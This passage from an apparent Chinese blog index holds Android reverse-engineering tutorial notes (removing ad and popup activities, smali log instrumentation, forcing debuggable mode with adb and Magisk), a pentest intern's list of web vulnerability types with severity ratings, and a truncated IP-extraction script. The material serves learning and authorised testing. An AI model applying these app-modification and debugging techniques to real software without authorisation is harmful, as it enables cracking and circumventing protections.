</span><br><span class=\"line\">    android:name=<span class=\"string\">&quot;com.zj.wuaipojie.ui.ChallengeFirst&quot;</span> /&gt;</span><br><span class=\"line\">&lt;activity  </span><br><span class=\"line\">    android:name=<span class=\"string\">&quot;com.zj.wuaipojie.ui.ChallengeFifth&quot;</span>  </span><br><span class=\"line\">    android:exported=<span class=\"string\">&quot;true&quot;</span> /&gt;  </span><br><span class=\"line\">&lt;activity  </span><br><span class=\"line\">    android:name=<span class=\"string\">&quot;com.zj.wuaipojie.ui.ChallengeFourth&quot;</span>  </span><br><span class=\"line\">    android:exported=<span class=\"string\">&quot;true&quot;</span> /&gt;  </span><br><span class=\"line\">&lt;activity  </span><br><span class=\"line\">    android:name=<span class=\"string\">&quot;com.zj.wuaipojie.ui.ChallengeThird&quot;</span>  </span><br><span class=\"line\">    android:exported=<span class=\"string\">&quot;false&quot;</span> /&gt;  </span><br><span class=\"line\">&lt;activity  </span><br><span class=\"line\">    android:name=<span class=\"string\">&quot;com.zj.wuaipojie.ui.ChallengeSecond&quot;</span>  </span><br><span class=\"line\">    android:exported=<span class=\"string\">&quot;false&quot;</span> /&gt;  </span><br><span class=\"line\">&lt;activity  </span><br><span class=\"line\">    android:name=<span class=\"string\">&quot;com.zj.wuaipojie.ui.AdActivity&quot;</span> /&gt;  </span><br></pre></td></tr></table></figure>\n\n<p>启动广告流程：<br>启动Activity-&gt;广告Activity-&gt;主页Activity</p>\n<p>修改方法：<br>1.修改加载时间<br>2.Acitivity切换定位，修改Intent的Activity类名</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">switch</span> (position) &#123;  </span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">0</span>:  </span><br><span class=\"line\">        <span class=\"type\">Intent</span> <span class=\"variable\">intent</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();  </span><br><span class=\"line\">        intent.setClass(it.getContext(), ChallengeFirst.class);  </span><br><span class=\"line\">        it.getContext().startActivity(intent);  </span><br><span class=\"line\">        <span class=\"keyword\">return</span>;  </span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">1</span>:  </span><br><span class=\"line\">        <span class=\"type\">Intent</span> <span class=\"variable\">intent2</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();  </span><br><span class=\"line\">        intent2.setClass(it.getContext(), ChallengeSecond.class);  </span><br><span class=\"line\">        it.getContext().startActivity(intent2);  </span><br><span class=\"line\">        <span class=\"keyword\">return</span>;  </span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">2</span>:  </span><br><span class=\"line\">        <span class=\"type\">Intent</span> <span class=\"variable\">intent3</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();  <span class=\"comment\">//new一个Intent，</span></span><br><span class=\"line\">        intent3.setClass(it.getContext(), AdActivity.class);  <span class=\"comment\">//传入要切换的Acitivity的类名</span></span><br><span class=\"line\">        it.getContext().startActivity(intent3);  <span class=\"comment\">//启动对应的Activity</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span>;  </span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">3</span>:  </span><br><span class=\"line\">        <span class=\"type\">Intent</span> <span class=\"variable\">intent4</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Intent</span>();  </span><br><span class=\"line\">        intent4.setClass(it.getContext(), ChallengeFourth.class);  </span><br><span class=\"line\">        it.getContext().startActivity(intent4);  </span><br><span class=\"line\">        <span class=\"keyword\">return</span>; </span><br><span class=\"line\">    <span class=\"keyword\">default</span>:  </span><br><span class=\"line\">        <span class=\"keyword\">return</span>;  </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Activity生命周期\"><a href=\"#Activity生命周期\" class=\"headerlink\" title=\"Activity生命周期\"></a>Activity生命周期</h3><table>\n<thead>\n<tr>\n<th align=\"center\">函数名称</th>\n<th align=\"center\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">onCreate()</td>\n<td align=\"center\">一个Activity启动后第一个被调用的函数，常用来在此方法中进行Activity的一些初始化操作。例如创建View，绑定数据，注册监听，加载参数等。</td>\n</tr>\n<tr>\n<td align=\"center\">onStart()</td>\n<td align=\"center\">当Activity显示在屏幕上时，此方法被调用但此时还无法进行与用户的交互操作。</td>\n</tr>\n<tr>\n<td align=\"center\">onResume()</td>\n<td align=\"center\">这个方法在onStart()之后调用，也就是在Activity准备好与用户进行交互的时候调用，此时的Activity一定位于Activity栈顶，处于运行状态。</td>\n</tr>\n<tr>\n<td align=\"center\">onPause()</td>\n<td align=\"center\">这个方法是在系统准备去启动或者恢复另外一个Activity的时候调用，通常在这个方法中执行一些释放资源的方法，以及保存一些关键数据。</td>\n</tr>\n<tr>\n<td align=\"center\">onStop()</td>\n<td align=\"center\">这个方法是在Activity完全不可见的时候调用的。</td>\n</tr>\n<tr>\n<td align=\"center\">onDestroy()</td>\n<td align=\"center\">这个方法在Activity销毁之前调用，之后Activity的状态为销毁状态。</td>\n</tr>\n<tr>\n<td align=\"center\">onRestart()</td>\n<td align=\"center\">当Activity从停止stop状态恢进入start状态时调用状态。</td>\n</tr>\n</tbody></table>\n<img src=\"https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230319154909284.png\" alt=\"image-20230319154909284\" style=\"zoom:50%;\" />\n\n<h3 id=\"弹窗定位-amp-堆栈分析\"><a href=\"#弹窗定位-amp-堆栈分析\" class=\"headerlink\" title=\"弹窗定位&amp;堆栈分析\"></a>弹窗定位&amp;堆栈分析</h3><p>修改方法：<br>1.修改xml中的versiocode<br>2.Hook弹窗(推荐算法助手开启弹窗定位)<br>3.修改dex弹窗代码<br>4.抓包修改响应体(也可以路由器拦截)</p>\n<h3 id=\"布局优化\"><a href=\"#布局优化\" class=\"headerlink\" title=\"布局优化\"></a>布局优化</h3><p>1.开发者助手抓布局<br>2.MT管理器xml搜索定位<br>3.修改xml代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">android:visibility=&quot;gone&quot;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"思路总结\"><a href=\"#思路总结\" class=\"headerlink\" title=\"思路总结\"></a>思路总结</h3><ul>\n<li>使用MT分析弹窗的activity</li>\n<li>进入classes.dex文件中搜索对应activity</li>\n<li>进行对应修改</li>\n<li>或者使用算法助手hook弹窗，或者看调用堆栈修改代码</li>\n<li>或者开发助手布局查看获取ID，xml搜索进行修改（注意设置ID转名称）</li>\n</ul>\n<h2 id=\"1000-7-x3D-？-amp-动态调试-amp-Log插桩\"><a href=\"#1000-7-x3D-？-amp-动态调试-amp-Log插桩\" class=\"headerlink\" title=\"1000-7&#x3D;？&amp;动态调试&amp;Log插桩\"></a>1000-7&#x3D;？&amp;动态调试&amp;Log插桩</h2><p><a href=\"https://www.52pojie.cn/thread-1714727-1-1.html\">《安卓逆向这档事》五、1000-7&#x3D;？&amp;动态调试&amp;Log插桩 - 『移动安全区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|www.52pojie.cn</a></p>\n<p><del>感觉开始上难度了。。。</del></p>\n<h3 id=\"目标-2\"><a href=\"#目标-2\" class=\"headerlink\" title=\"目标\"></a>目标</h3><p>了解并掌握动态调试<br>了解并掌握Log插桩</p>\n<h3 id=\"工具-2\"><a href=\"#工具-2\" class=\"headerlink\" title=\"工具\"></a>工具</h3><p>教程Demo<br>MT管理器&#x2F;NP管理器<br>jeb（相当于IDA java版）<br>雷电模拟器<br>XappDebug</p>\n<h3 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h3><p>什么是动态调试：动态调试是指自带的调试器跟踪自己软件的运行，可以在调试的过程中知道参数或者局部变量的值以及履清代码运行的先后顺序。多用于爆破注册码(CTF必备技能)</p>\n<p>Log插桩:Log插桩指的是反编译APK文件时，在对应的smali文件里，添加相应的smali代码，将程序中的关键信息，以log日志的形式进行输出。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">invoke-<span class=\"keyword\">static</span> &#123;对应寄存器&#125;, Lcom/mtools/LogUtils;-&gt;v(Ljava/lang/Object;)V</span><br></pre></td></tr></table></figure>\n\n\n\n<h3 id=\"动态调试步骤\"><a href=\"#动态调试步骤\" class=\"headerlink\" title=\"动态调试步骤\"></a>动态调试步骤</h3><h4 id=\"修改debug权限\"><a href=\"#修改debug权限\" class=\"headerlink\" title=\"修改debug权限\"></a>修改debug权限</h4><p>方法一:在AndroidManifest.xml里添加可调试权限</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">android:debuggable=<span class=\"string\">&quot;true&quot;</span> <span class=\"comment\">//application里面修改</span></span><br></pre></td></tr></table></figure>\n\n<p>方法二：XappDebug模块hook对应的app</p>\n<p><a href=\"https://github.com/Palatis/XAppDebug\">XappDebug</a></p>\n<p>方法三：Magisk命令(重启失效)</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">1.  adb shell #adb进入命令行模式</span><br><span class=\"line\">2.  su #切换至超级用户</span><br><span class=\"line\">3.  magisk resetprop ro.debuggable 1</span><br><span class=\"line\">4.  stop;start; #一定要通过该方式重启</span><br></pre></td></tr></table></figure>\n\n<p>方法四:刷入MagiskHide Props Config模块(比较麻烦）</p>\n<h4 id=\"端口转发以及开启adb权限\"><a href=\"#端口转发以及开启adb权限\" class=\"headerlink\" title=\"端口转发以及开启adb权限\"></a>端口转发以及开启adb权限</h4><p>版本号点击七次开启开发者模式并开启adb调试权限</p>\n<p>夜神模拟器：adb connect 127.0.0.1:62001</p>\n<h4 id=\"下段点\"><a href=\"#下段点\" class=\"headerlink\" title=\"下段点\"></a>下段点</h4><p>ctrl+b下断点</p>\n<h4 id=\"debug模式启动\"><a href=\"#debug模式启动\" class=\"headerlink\" title=\"debug模式启动\"></a>debug模式启动</h4><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">adb shell am start -D -n com.zj.wuaipojie/.ui.MainActivity</span><br></pre></td></tr></table></figure>\n\n<p>adb shell am start -D -n<br>adb shell am start -D -n 包名&#x2F;类名<br>am start -n 表示启动一个activity<br>am start -D 表示将应用设置为可调试模式</p>\n<h4 id=\"Jeb附加调试进程\"><a href=\"#Jeb附加调试进程\" class=\"headerlink\" title=\"Jeb附加调试进程\"></a>Jeb附加调试进程</h4><p>激活jeb</p>\n<p>这章云了。。。</p>\n","tags":["android"]},{"title":"internship_record","url":"/2023/03/14/internship-record/","content":"<h2 id=\"三月\"><a href=\"#三月\" class=\"headerlink\" title=\"三月\"></a>三月</h2><h3 id=\"15日\"><a href=\"#15日\" class=\"headerlink\" title=\"15日\"></a>15日</h3><p>summary：第一天入职 了解了请假、补假的流程，对工作稍微有了些数。对保密有了一定的了解。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">事情</th>\n<th align=\"center\">完成情况</th>\n<th align=\"center\">备注</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">url跳转漏洞验证+报告</td>\n<td align=\"center\">共写22条报告</td>\n<td align=\"center\"></td>\n</tr>\n</tbody></table>\n<h3 id=\"17日\"><a href=\"#17日\" class=\"headerlink\" title=\"17日\"></a>17日</h3><p>进行漏洞种类的看</p>\n<p>下面写下看到的漏洞及等级</p>\n<p>summary：找到了两个低危，以及进行学习，处理报告</p>\n<h4 id=\"web漏洞\"><a href=\"#web漏洞\" class=\"headerlink\" title=\"web漏洞\"></a>web漏洞</h4><p>等级判定可参考：<a href=\"https://help.aliyun.com/document_detail/40067.html\">https://help.aliyun.com/document_detail/40067.html</a></p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">漏洞名称</th>\n<th align=\"center\">等级</th>\n<th align=\"center\">备注</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">短信验证码可暴力破解</td>\n<td align=\"center\">中</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">敏感文件泄露</td>\n<td align=\"center\">低</td>\n<td align=\"center\">error.log</td>\n</tr>\n<tr>\n<td align=\"center\">敏感文件泄露</td>\n<td align=\"center\">低</td>\n<td align=\"center\">nginx-status</td>\n</tr>\n<tr>\n<td align=\"center\">敏感文件泄露</td>\n<td align=\"center\">低</td>\n<td align=\"center\">前端加密方法泄露也算</td>\n</tr>\n<tr>\n<td align=\"center\">存储型XSS</td>\n<td align=\"center\">高</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">弱口令</td>\n<td align=\"center\">高</td>\n<td align=\"center\">弱口令竟然都算高</td>\n</tr>\n<tr>\n<td align=\"center\">验证码失效</td>\n<td align=\"center\">中</td>\n<td align=\"center\">验证码没在服务器端验证</td>\n</tr>\n<tr>\n<td align=\"center\">crossdomain.xml文件配置不当</td>\n<td align=\"center\">中</td>\n<td align=\"center\">可能导致csrf</td>\n</tr>\n<tr>\n<td align=\"center\">反射型xss</td>\n<td align=\"center\">中</td>\n<td align=\"center\">恶意代码并没有保存在目标网站，通过引诱用户点击一个链接到目标网站的恶意链接来实施攻击的</td>\n</tr>\n<tr>\n<td align=\"center\">逻辑漏洞之任意用户登录</td>\n<td align=\"center\">高</td>\n<td align=\"center\">修改返回包直接登录</td>\n</tr>\n<tr>\n<td align=\"center\">暴力破解</td>\n<td align=\"center\">中</td>\n<td align=\"center\">密码错误长度相同，且多次爆破没返回次数限制</td>\n</tr>\n<tr>\n<td align=\"center\">越权访问</td>\n<td align=\"center\">低</td>\n<td align=\"center\">根据越权修改ID获取他人余额(看到有的等级是高</td>\n</tr>\n<tr>\n<td align=\"center\">内网IP地址泄露</td>\n<td align=\"center\">低</td>\n<td align=\"center\">直接返回IP而不是域名，惊（注释的内网IP泄露竟然也算</td>\n</tr>\n<tr>\n<td align=\"center\">Fastjson反序列化漏洞</td>\n<td align=\"center\">中</td>\n<td align=\"center\">可以dnslog验证，（看到json数据传输可以试试看是不是fastjson，也是其一个特征，<a href=\"https://cloud.tencent.com/developer/article/1957185\">浅析FastJSON反序列化漏洞（1.2.24——1.2.68） - 腾讯云开发者社区-腾讯云 (tencent.com)</a></td>\n</tr>\n<tr>\n<td align=\"center\">信息泄露</td>\n<td align=\"center\">低|高</td>\n<td align=\"center\">破坏请求头结构，使得报错，返回详细报错信息（等级看泄露东西的严重性</td>\n</tr>\n<tr>\n<td align=\"center\">链接注入漏洞</td>\n<td align=\"center\">中</td>\n<td align=\"center\">感觉属于xss，但可以点击链接跳转（确实，同一个点刷了两个洞</td>\n</tr>\n<tr>\n<td align=\"center\">任意文件上传</td>\n<td align=\"center\">中</td>\n<td align=\"center\">上传任意后缀文件</td>\n</tr>\n<tr>\n<td align=\"center\">CSRF</td>\n<td align=\"center\">中</td>\n<td align=\"center\">对应表单，burp抓包，bp CSRF POC构造</td>\n</tr>\n<tr>\n<td align=\"center\">未授权访问</td>\n<td align=\"center\">中|高</td>\n<td align=\"center\">直接不需要登录就管理界面，加token等</td>\n</tr>\n<tr>\n<td align=\"center\">软件压缩目录泄露</td>\n<td align=\"center\">中</td>\n<td align=\"center\">可以多扫目录试试</td>\n</tr>\n<tr>\n<td align=\"center\">Webpack源码泄漏</td>\n<td align=\"center\">中</td>\n<td align=\"center\">webpack是一个打包器，能将多个文件打包成一个文件。（在源代码处看到webpack可以仔细检查确定是否存在该漏洞</td>\n</tr>\n<tr>\n<td align=\"center\">CORS</td>\n<td align=\"center\">中</td>\n<td align=\"center\">特征：Access-Control-Allow-Origin：*，cors漏洞一般用于窃取用户敏感数据</td>\n</tr>\n<tr>\n<td align=\"center\">tomcat示例目录未删除</td>\n<td align=\"center\">低</td>\n<td align=\"center\">*&#x2F;docs&#x2F;，存在说明文档</td>\n</tr>\n<tr>\n<td align=\"center\">目录浏览</td>\n<td align=\"center\">低</td>\n<td align=\"center\">利用该信息可以更容易得到网站权限</td>\n</tr>\n<tr>\n<td align=\"center\">spring-boot端点未授权</td>\n<td align=\"center\">高</td>\n<td align=\"center\">例如：*&#x2F;prod-api&#x2F;actuator&#x2F;env，会泄露敏感信息；特征：左上角绿叶，对应报错信息；参考：<a href=\"https://blog.csdn.net/guo15890025019/article/details/119885737\">Spring Boot Actuator未授权访问漏洞利用_springboot漏洞利用_大鸟安全的博客-CSDN博客</a></td>\n</tr>\n<tr>\n<td align=\"center\">图形验证码失效</td>\n<td align=\"center\">中</td>\n<td align=\"center\">使用相同验证码多次重发，验证码仍可用</td>\n</tr>\n<tr>\n<td align=\"center\">中间件版本泄露</td>\n<td align=\"center\">低</td>\n<td align=\"center\">一般不收</td>\n</tr>\n<tr>\n<td align=\"center\">批量提交</td>\n<td align=\"center\">中</td>\n<td align=\"center\">表单重复提交，会造成数据重复，增加服务器负载，严重甚至会造成服务器宕机（这都算</td>\n</tr>\n<tr>\n<td align=\"center\">swagger未授权</td>\n<td align=\"center\">高</td>\n<td align=\"center\"><a href=\"https://cloud.tencent.com/developer/article/2160217\">Swagger未授权访问漏洞 - 腾讯云开发者社区-腾讯云 (tencent.com)</a>，会暴露接口地址，从而可能被进行利用</td>\n</tr>\n<tr>\n<td align=\"center\">短信验证码爆破漏洞</td>\n<td align=\"center\">低</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">用户名枚举</td>\n<td align=\"center\">低</td>\n<td align=\"center\">可以根据验证码结合，当用户存在会发验证码，不存在不会发</td>\n</tr>\n<tr>\n<td align=\"center\">Thymeleaf远程命令执行</td>\n<td align=\"center\">高</td>\n<td align=\"center\">若依CMS</td>\n</tr>\n<tr>\n<td align=\"center\">接口文档泄露</td>\n<td align=\"center\">高</td>\n<td align=\"center\">有的XML文档包含接口也算</td>\n</tr>\n<tr>\n<td align=\"center\">phpinfo界面泄露</td>\n<td align=\"center\">中</td>\n<td align=\"center\"></td>\n</tr>\n<tr>\n<td align=\"center\">Nginx主机实时监控流量数据泄露</td>\n<td align=\"center\">高</td>\n<td align=\"center\">*&#x2F;statusicon&#x2F;</td>\n</tr>\n<tr>\n<td align=\"center\">Source Map</td>\n<td align=\"center\">中</td>\n<td align=\"center\">*.js.map</td>\n</tr>\n<tr>\n<td align=\"center\">Springboot Snake YAML</td>\n<td align=\"center\">高</td>\n<td align=\"center\">反弹shell</td>\n</tr>\n<tr>\n<td align=\"center\">上传jspgetshell</td>\n<td align=\"center\">高</td>\n<td align=\"center\"></td>\n</tr>\n</tbody></table>\n<h4 id=\"APP漏洞：\"><a href=\"#APP漏洞：\" class=\"headerlink\" title=\"APP漏洞：\"></a>APP漏洞：</h4><p><del>等我学习了在更新</del></p>\n<h3 id=\"20日\"><a href=\"#20日\" class=\"headerlink\" title=\"20日\"></a>20日</h3><p>summary:找到二个中危（表单无限制提交、密码爆破）、二个低危（敏感信息泄露）、对内网资产进行整合共整合IP10894条</p>\n<p>下面是今天写的IP资产整合的代码，代码挺丑</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pandas <span class=\"keyword\">as</span> pd</span><br><span class=\"line\">df = pd.read_excel(<span class=\"string\">&#x27;1.xlsx&#x27;</span>)</span><br><span class=\"line\"><span class=\"comment\"># print(df.describe())</span></span><br><span class=\"line\">columns = df.columns.values.tolist()  <span class=\"comment\">### 获取excel 表头 ，第一行</span></span><br><span class=\"line\"><span class=\"comment\"># res=[]</span></span><br><span class=\"line\">myfile = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;res.txt&quot;</span>, <span class=\"string\">&quot;w&quot;</span>)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ip_identify1</span>(<span class=\"params\">ip</span>):  <span class=\"comment\"># 192.168.1.1</span></span><br><span class=\"line\">    result = <span class=\"literal\">False</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        iplist = ip.split(<span class=\"string\">&quot;.&quot;</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(iplist) == <span class=\"number\">4</span>:</span><br><span class=\"line\">            check_count = <span class=\"number\">0</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> iplist:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> (<span class=\"built_in\">int</span>(i) &lt;= <span class=\"number\">255</span> <span class=\"keyword\">and</span> <span class=\"built_in\">int</span>(i) &gt;= <span class=\"number\">0</span>):</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    check_count += <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> check_count == <span class=\"number\">4</span>: result = <span class=\"literal\">True</span>  <span class=\"comment\"># ip</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\">    <span class=\"keyword\">finally</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> result</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">ip_identify2</span>(<span class=\"params\">ip</span>):  <span class=\"comment\"># 192.168.1.2-13</span></span><br><span class=\"line\">    result = <span class=\"literal\">False</span></span><br><span class=\"line\">    start = <span class=\"number\">0</span></span><br><span class=\"line\">    end = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        iplist = ip.split(<span class=\"string\">&quot;.&quot;</span>)</span><br><span class=\"line\">        checkCount = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(iplist) == <span class=\"number\">4</span>:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">3</span>):</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> (<span class=\"number\">255</span> &gt;= <span class=\"built_in\">int</span>(iplist[i]) &gt;= <span class=\"number\">0</span>):</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    checkCount += <span class=\"number\">1</span></span><br><span class=\"line\">            <span class=\"comment\"># 处理有-的</span></span><br><span class=\"line\">            _numcount = <span class=\"number\">0</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> iplist[<span class=\"number\">3</span>]:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> j == <span class=\"string\">&quot;-&quot;</span> <span class=\"keyword\">or</span> (<span class=\"built_in\">int</span>(j) &lt;= <span class=\"number\">255</span> <span class=\"keyword\">and</span> <span class=\"built_in\">int</span>(j) &gt;= <span class=\"number\">0</span>) :</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> j == <span class=\"string\">&quot;-&quot;</span>:</span><br><span class=\"line\">                        _numcount += <span class=\"number\">1</span></span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> _numcount == <span class=\"number\">1</span>:</span><br><span class=\"line\">                _index = iplist[<span class=\"number\">3</span>].find(<span class=\"string\">&#x27;-&#x27;</span>)</span><br><span class=\"line\">                start = iplist[<span class=\"number\">3</span>][:_index]</span><br><span class=\"line\">                end = iplist[<span class=\"number\">3</span>][_index + <span class=\"number\">1</span>:]</span><br><span class=\"line\">                checkCount += <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> checkCount == <span class=\"number\">4</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> start&gt;end:</span><br><span class=\"line\">                temp=end</span><br><span class=\"line\">                end=start</span><br><span class=\"line\">                start=temp</span><br><span class=\"line\">            <span class=\"keyword\">return</span> iplist[<span class=\"number\">0</span>] + <span class=\"string\">&quot;.&quot;</span> + iplist[<span class=\"number\">1</span>] + <span class=\"string\">&quot;.&quot;</span> + iplist[<span class=\"number\">2</span>] + <span class=\"string\">&quot;.&quot;</span>, start, end</span><br><span class=\"line\">    <span class=\"keyword\">except</span> Exception <span class=\"keyword\">as</span> e:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> idx, row <span class=\"keyword\">in</span> df.iterrows():  <span class=\"comment\">### 迭代数据 以键值对的形式 获取 每行的数据</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> column <span class=\"keyword\">in</span> columns:</span><br><span class=\"line\">        <span class=\"comment\"># print(row[column])</span></span><br><span class=\"line\">        curstr = row[column]</span><br><span class=\"line\">        <span class=\"keyword\">if</span> pd.isna(curstr):</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            strlen = <span class=\"built_in\">len</span>(curstr)</span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        i = <span class=\"number\">0</span></span><br><span class=\"line\">        j = <span class=\"number\">7</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> j &gt; strlen:</span><br><span class=\"line\">            <span class=\"keyword\">continue</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>, strlen + <span class=\"number\">1</span>):</span><br><span class=\"line\">            <span class=\"comment\"># print(res)</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, j):</span><br><span class=\"line\">                tempstr = curstr[i:j]</span><br><span class=\"line\">                <span class=\"comment\"># 分成两种进行判断要么是类型一要么是类型二</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> ip_identify1(tempstr):</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> <span class=\"built_in\">str</span>.isdigit(curstr[j - <span class=\"number\">1</span>]):</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (j != strlen <span class=\"keyword\">and</span> <span class=\"keyword\">not</span> <span class=\"built_in\">str</span>.isdigit(curstr[j])) <span class=\"keyword\">or</span> j == strlen:<span class=\"comment\">#j后面不能有数字，i前面也不能有数字</span></span><br><span class=\"line\">                            <span class=\"keyword\">if</span> i&gt;<span class=\"number\">0</span> <span class=\"keyword\">and</span> <span class=\"built_in\">str</span>.isdigit(curstr[i-<span class=\"number\">1</span>]):</span><br><span class=\"line\">                                <span class=\"keyword\">continue</span></span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (ip_identify1(tempstr)):</span><br><span class=\"line\">                                <span class=\"comment\"># res.append(tempstr)</span></span><br><span class=\"line\">                                myfile.write(tempstr + <span class=\"string\">&quot;\\n&quot;</span>)</span><br><span class=\"line\">                            ipres = ip_identify2(tempstr)</span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (ipres):</span><br><span class=\"line\">                                <span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">int</span>(ipres[<span class=\"number\">1</span>]), <span class=\"built_in\">int</span>(ipres[<span class=\"number\">2</span>]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">                                    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                                        myfile.write(tempstr + <span class=\"string\">&quot;\\n&quot;</span>)</span><br><span class=\"line\">                                        <span class=\"comment\"># res.append(ipres[0] + str(k))</span></span><br><span class=\"line\">                                    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">                                        <span class=\"keyword\">pass</span></span><br><span class=\"line\">                <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                    ipres = ip_identify2(tempstr)</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> j&lt;strlen-<span class=\"number\">1</span> <span class=\"keyword\">and</span> <span class=\"built_in\">str</span>.isdigit(curstr[j]):  <span class=\"comment\"># j后面不能有数字，i前面也不能有数字</span></span><br><span class=\"line\">                            <span class=\"keyword\">continue</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> i &gt; <span class=\"number\">0</span> <span class=\"keyword\">and</span> <span class=\"built_in\">str</span>.isdigit(curstr[i - <span class=\"number\">1</span>]):</span><br><span class=\"line\">                        <span class=\"keyword\">continue</span></span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (ipres):</span><br><span class=\"line\">                        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                            <span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">int</span>(ipres[<span class=\"number\">1</span>]), <span class=\"built_in\">int</span>(ipres[<span class=\"number\">2</span>]) + <span class=\"number\">1</span>):</span><br><span class=\"line\">                                <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                                    myfile.write(ipres[<span class=\"number\">0</span>]+<span class=\"built_in\">str</span>(k) + <span class=\"string\">&quot;\\n&quot;</span>)</span><br><span class=\"line\">                                    <span class=\"comment\"># res.append(ipres[0] + str(k))</span></span><br><span class=\"line\">                                <span class=\"keyword\">except</span>:</span><br><span class=\"line\">                                    <span class=\"keyword\">pass</span></span><br><span class=\"line\">                        <span 